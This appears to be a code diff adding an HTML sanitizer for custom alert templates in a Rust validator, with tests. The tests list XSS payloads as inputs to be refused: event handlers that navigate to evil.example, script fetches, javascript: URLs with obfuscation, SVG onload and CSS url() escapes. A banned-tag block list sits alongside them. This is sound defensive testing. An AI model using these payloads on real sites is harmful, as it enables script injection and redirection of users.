@@ -322,6 +322,8 @@ pub enum RuleError {
     CustomCss(String),
     #[error("variation '{name}': {reason}")]
     CustomSchema { name: String, reason: String },
+    #[error("variation '{name}': custom HTML {reason}")]
+    CustomHtml { name: String, reason: String },
 }
 
 /// Event kinds a rule may target.
@@ -489,36 +491,62 @@ fn validate_template_tokens(var_name: &str, src: &str, custom_keys: &HashSet<Str
     Ok(())
 }
 
-/// Strips `<style>...</style>` and `<script>...</script>` blocks so CSS/JS braces aren't treated as tokens.
-fn strip_code_blocks(html: &str) -> String {
-    let lower = html.to_ascii_lowercase();
-    let mut out = String::with_capacity(html.len());
-    let mut i = 0;
-    while i < html.len() {
-        let rest_lower = &lower[i..];
-        let tag_end = if rest_lower.starts_with("<style") {
-            Some("</style>")
-        } else if rest_lower.starts_with("<script") {
-            Some("</script>")
-        } else {
-            None
-        };
-        if let Some(close_tag) = tag_end
-            && let Some(end_rel) = rest_lower.find(close_tag)
-        {
-            i += end_rel + close_tag.len();
-            continue;
-        }
-        let Some(ch) = html[i..].chars().next() else { break };
-        out.push(ch);
-        i += ch.len_utf8();
-    }
-    out
+/// Tags custom HTML may not use: anything that runs code, navigates, loads a page or a
+/// sound, or whose text the browser parses differently (raw text).
+const BANNED_TAGS: [&str; 33] = [
+    "script",
+    "meta",
+    "base",
+    "form",
+    "iframe",
+    "frame",
+    "frameset",
+    "object",
+    "embed",
+    "link",
+    "applet",
+    "noscript",
+    "noembed",
+    "noframes",
+    "xmp",
+    "plaintext",
+    "textarea",
+    "title",
+    "template",
+    "math",
+    "foreignobject",
+    "use",
+    "animate",
+    "set",
+    "animatemotion",
+    "animatetransform",
+    "input",
+    "button",
+    "select",
+    "audio",
+    "video",
+    "source",
+    "track",
+];
+
+/// Attributes that take a URL: only `#anchors`, small `data:image/` pictures and the
+/// allowed picture hosts are fine in them.
+const URL_ATTRS: [&str; 11] =
+    ["href", "src", "xlink:href", "poster", "data", "background", "srcset", "cite", "longdesc", "manifest", "icon"];
+
+/// Attributes a viewer's words may be written into (never a URL, style or handler).
+fn token_attr_ok(name: &str) -> bool {
+    matches!(name, "alt" | "title" | "aria-label" | "aria-description" | "aria-valuetext") || name.starts_with("data-")
 }
 
-fn validate_html_tokens(var_name: &str, html: &str, custom_keys: &HashSet<String>) -> Result<(), RuleError> {
-    let visible = strip_code_blocks(html);
-    let chars: Vec<char> = visible.chars().collect();
+fn html_err(name: &str, reason: impl Into<String>) -> RuleError {
+    RuleError::CustomHtml { name: name.to_string(), reason: reason.into() }
+}
+
+/// `{token}` names in `text` (a `{{` is a literal brace).
+fn tokens_in(text: &str) -> Vec<String> {
+    let chars: Vec<char> = text.chars().collect();
+    let mut out = Vec::new();
     let mut i = 0;
     while i < chars.len() {
         if chars[i] == '{' {
@@ -528,12 +556,9 @@ fn validate_html_tokens(var_name: &str, html: &str, custom_keys: &HashSet<String
             }
             if let Some(rel_end) = chars[i + 1..].iter().position(|&c| c == '}') {
                 let inner: String = chars[i + 1..i + 1 + rel_end].iter().collect();
-                let raw_tok = inner.split('|').next().unwrap_or("");
-                if !raw_tok.is_empty()
-                    && raw_tok.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_' || b == b':')
-                    && !is_allowed_token(raw_tok, custom_keys)
-                {
-                    return Err(RuleError::UnknownToken { name: var_name.to_string(), token: raw_tok.to_string() });
+                let raw = inner.split('|').next().unwrap_or("").trim().to_string();
+                if !raw.is_empty() && raw.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_' || b == b':') {
+                    out.push(raw);
                 }
                 i += rel_end + 2;
                 continue;
@@ -541,7 +566,193 @@ fn validate_html_tokens(var_name: &str, html: &str, custom_keys: &HashSet<String
         }
         i += 1;
     }
-    Ok(())
+    out
+}
+
+fn url_attr_ok(value: &str) -> bool {
+    let v = value.trim().to_ascii_lowercase();
+    if v.chars().any(|c| c.is_control() || c.is_whitespace()) || v.contains('&') || v.contains('\\') {
+        return false;
+    }
+    if v.starts_with('#') {
+        return true;
+    }
+    if let Some(rest) = v.strip_prefix("data:image/") {
+        return ["png", "jpeg", "gif", "webp", "avif"].iter().any(|t| rest.starts_with(&format!("{t};")));
+    }
+    if let Some(rest) = v.strip_prefix("https://") {
+        let host = rest.split(['/', '?', '#']).next().unwrap_or("");
+        return ALLOWED_ASSET_HOSTS.iter().any(|h| h.strip_prefix("https://") == Some(host));
+    }
+    false
+}
+
+/// Reads custom HTML the way a browser splits it into tags, text and `<style>` blocks, and
+/// refuses what could run code, navigate, fetch or break out of a token's context. The
+/// overlay's sandbox page enforces the same rules on the parsed document; this is the
+/// early, explained refusal at save time.
+fn check_custom_html(name: &str, html: &str, custom_keys: &HashSet<String>) -> Result<(), RuleError> {
+    let chars: Vec<char> = html.chars().collect();
+    let lower: Vec<char> = html.to_ascii_lowercase().chars().collect();
+    let unknown = |tok: &str| RuleError::UnknownToken { name: name.to_string(), token: tok.to_string() };
+    let mut i = 0;
+    let mut text = String::new();
+    let flush_text = |text: &mut String| -> Result<(), RuleError> {
+        for tok in tokens_in(text) {
+            if !is_allowed_token(&tok, custom_keys) {
+                return Err(unknown(&tok));
+            }
+        }
+        text.clear();
+        Ok(())
+    };
+    while i < chars.len() {
+        if chars[i] != '<' {
+            text.push(chars[i]);
+            i += 1;
+            continue;
+        }
+        let rest: String = lower[i..chars.len().min(i + 9)].iter().collect();
+        if rest.starts_with("<!--") {
+            let Some(end) = (i + 4..chars.len().saturating_sub(2)).find(|&j| lower[j..j + 3] == ['-', '-', '>']) else {
+                return Err(html_err(name, "has a comment that never closes"));
+            };
+            i = end + 3;
+            continue;
+        }
+        if rest.starts_with("<!") || rest.starts_with("<?") {
+            let Some(end) = (i..chars.len()).find(|&j| chars[j] == '>') else {
+                return Err(html_err(name, "has markup that never closes"));
+            };
+            i = end + 1;
+            continue;
+        }
+        let next = chars.get(i + 1).copied().unwrap_or(' ');
+        if !(next.is_ascii_alphabetic() || (next == '/' && chars.get(i + 2).is_some_and(char::is_ascii_alphabetic))) {
+            text.push('<');
+            i += 1;
+            continue;
+        }
+        flush_text(&mut text)?;
+        let closing = next == '/';
+        i += if closing { 2 } else { 1 };
+        let start = i;
+        while i < chars.len() && !(chars[i].is_whitespace() || chars[i] == '/' || chars[i] == '>') {
+            i += 1;
+        }
+        let tag: String = lower[start..i].iter().collect();
+        if tag.contains('{') {
+            return Err(html_err(name, "can't put a {token} in a tag name"));
+        }
+        if BANNED_TAGS.contains(&tag.as_str()) {
+            return Err(html_err(name, format!("can't use <{tag}>: custom alerts are HTML and CSS only")));
+        }
+        // Attributes.
+        let mut attrs: Vec<(String, String)> = Vec::new();
+        loop {
+            while i < chars.len() && (chars[i].is_whitespace() || chars[i] == '/') {
+                i += 1;
+            }
+            if i >= chars.len() {
+                return Err(html_err(name, "has a tag that never closes"));
+            }
+            if chars[i] == '>' {
+                i += 1;
+                break;
+            }
+            let astart = i;
+            while i < chars.len() && !(chars[i].is_whitespace() || matches!(chars[i], '=' | '>' | '/')) {
+                i += 1;
+            }
+            let aname: String = lower[astart..i].iter().collect();
+            if aname.contains('{') || aname.is_empty() {
+                return Err(html_err(name, "can't put a {token} where an attribute name goes"));
+            }
+            while i < chars.len() && chars[i].is_whitespace() {
+                i += 1;
+            }
+            let mut value = String::new();
+            if chars.get(i) == Some(&'=') {
+                i += 1;
+                while i < chars.len() && chars[i].is_whitespace() {
+                    i += 1;
+                }
+                match chars.get(i) {
+                    Some(&q) if q == '"' || q == '\'' => {
+                        i += 1;
+                        let vstart = i;
+                        while i < chars.len() && chars[i] != q {
+                            i += 1;
+                        }
+                        if i >= chars.len() {
+                            return Err(html_err(name, "has an attribute that never closes"));
+                        }
+                        value = chars[vstart..i].iter().collect();
+                        i += 1;
+                    }
+                    _ => {
+                        let vstart = i;
+                        while i < chars.len() && !chars[i].is_whitespace() && chars[i] != '>' {
+                            i += 1;
+                        }
+                        value = chars[vstart..i].iter().collect();
+                    }
+                }
+            }
+            attrs.push((aname, value));
+        }
+        if closing {
+            continue;
+        }
+        for (aname, value) in &attrs {
+            if aname.starts_with("on")
+                || matches!(aname.as_str(), "srcdoc" | "formaction" | "action" | "http-equiv" | "ping")
+            {
+                return Err(html_err(name, format!("can't use the \"{aname}\" attribute")));
+            }
+            if URL_ATTRS.contains(&aname.as_str()) {
+                if !tokens_in(value).is_empty() {
+                    return Err(html_err(name, format!("can't put a {{token}} in \"{aname}\"")));
+                }
+                if !url_attr_ok(value) {
+                    return Err(html_err(
+                        name,
+                        format!("\"{aname}\" can only be a #anchor, a data:image/ picture or an allowed picture host"),
+                    ));
+                }
+                continue;
+            }
+            if aname == "style" {
+                if !tokens_in(value).is_empty() {
+                    return Err(html_err(name, "can't put a {token} in a style attribute"));
+                }
+                check_css(&format!("variation '{name}' style attribute"), &format!("x{{{value}}}"))
+                    .map_err(RuleError::CustomCss)?;
+                continue;
+            }
+            for tok in tokens_in(value) {
+                if !token_attr_ok(aname) {
+                    return Err(html_err(
+                        name,
+                        format!(
+                            "can only put a {{token}} in text or in alt, title, aria-label and data-* (not \"{aname}\")"
+                        ),
+                    ));
+                }
+                if !is_allowed_token(&tok, custom_keys) {
+                    return Err(unknown(&tok));
+                }
+            }
+        }
+        if tag == "style" {
+            let close = (i..chars.len()).find(|&j| lower[j..].starts_with(&['<', '/', 's', 't', 'y', 'l', 'e']));
+            let end = close.unwrap_or(chars.len());
+            let css: String = chars[i..end].iter().collect();
+            check_css(&format!("variation '{name}' <style>"), &css).map_err(RuleError::CustomCss)?;
+            i = end;
+        }
+    }
+    flush_text(&mut text)
 }
 
 impl AlertRule {
@@ -589,7 +800,7 @@ impl AlertRule {
             for src in [&v.title, &v.body] {
                 validate_template_tokens(&v.name, src, &custom_keys)?;
             }
-            validate_html_tokens(&v.name, &v.html, &custom_keys)?;
+            check_custom_html(&v.name, &v.html, &custom_keys)?;
         }
         Ok(())
     }
@@ -1201,5 +1412,78 @@ mod tests {
         assert_eq!(parsed.anim, default_alert_anim());
         assert!(!parsed.custom_enabled);
         assert!(parsed.fields.is_empty());
+    }
+
+    fn custom_rule(html: &str) -> AlertRule {
+        let mut r = sub_rule();
+        r.variations[0].custom_enabled = true;
+        r.variations[0].html = html.into();
+        r
+    }
+
+    #[test]
+    fn custom_html_cannot_carry_script_navigation_or_event_handlers() {
+        for bad in [
+            "<p>{message}</p><img src=\"data:,\" onerror=\"location.replace('https://evil.example/')\">",
+            "<div onclick=\"x()\">hi</div>",
+            "<DIV ONMOUSEOVER=x>hi</DIV>",
+            "<script>fetch('https://evil.example')</script>",
+            "<svg><script>1</script></svg>",
+            "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">",
+            "<base href=\"https://evil.example/\">",
+            "<form action=\"https://evil.example\"><button>go</button></form>",
+            "<iframe src=\"https://evil.example\"></iframe>",
+            "<object data=\"x\"></object>",
+            "<a href=\"javascript:alert(1)\">x</a>",
+            "<a href=\" JaVa\tscript:alert(1)\">x</a>",
+            "<a href=\"&#106;avascript:alert(1)\">x</a>",
+            "<img src=\"https://evil.example/p.gif\">",
+            "<img src=\"data:image/svg+xml,<svg onload=alert(1)>\">",
+            "<audio src=\"data:audio/wav;base64,AAAA\" autoplay></audio>",
+            "<svg><animate attributeName=\"href\" values=\"javascript:1\"/></svg>",
+            "<div style=\"background:url(https://evil.example/a.png)\">x</div>",
+            "<style>@import url(https://evil.example/a.css);</style>",
+            "<style>.a{background:u\\72l(https://evil.example/a.png)}</style>",
+        ] {
+            let r = custom_rule(bad);
+            assert!(
+                matches!(r.validate(), Err(RuleError::CustomHtml { .. }) | Err(RuleError::CustomCss(_))),
+                "should be refused: {bad}"
+            );
+        }
+        for good in [
+            "<div class='card'><span>{name}</span><b>{message}</b></div>",
+            "<img src=\"https://cdn.discordapp.com/a.png\" alt=\"{name}\">",
+            "<img src=\"data:image/png;base64,AAAA\" alt=\"\">",
+            "<div style=\"color:#fff;background:linear-gradient(red,blue)\" title=\"{name}\">x</div>",
+            "<style>.card{color:#fff}</style><p class=\"card\" data-who=\"{name}\">{{literal}}</p>",
+            "<!-- a note --><p>{amount|default:\"0\"}</p>",
+        ] {
+            let r = custom_rule(good);
+            assert!(r.validate().is_ok(), "should be accepted: {good}: {:?}", r.validate());
+        }
+    }
+
+    #[test]
+    fn tokens_only_fill_text_and_plain_attributes() {
+        for bad in [
+            "<div class=\"{name}\">x</div>",
+            "<div class={name}>x</div>",
+            "<img src=\"{message}\">",
+            "<div style=\"color:{message}\">x</div>",
+            "<div {name}>x</div>",
+        ] {
+            assert!(
+                matches!(custom_rule(bad).validate(), Err(RuleError::CustomHtml { .. })),
+                "token must be refused here: {bad}"
+            );
+        }
+        // Tokens in a <style> block are not substituted, so they are not checked either.
+        assert!(custom_rule("<style>.a{content:'{bogus}'}</style><p>{name}</p>").validate().is_ok());
+        // An unknown token in text is still named.
+        assert!(matches!(
+            custom_rule("<p>{bogus}</p>").validate(),
+            Err(RuleError::UnknownToken { ref token, .. }) if token == "bogus"
+        ));
     }
 }
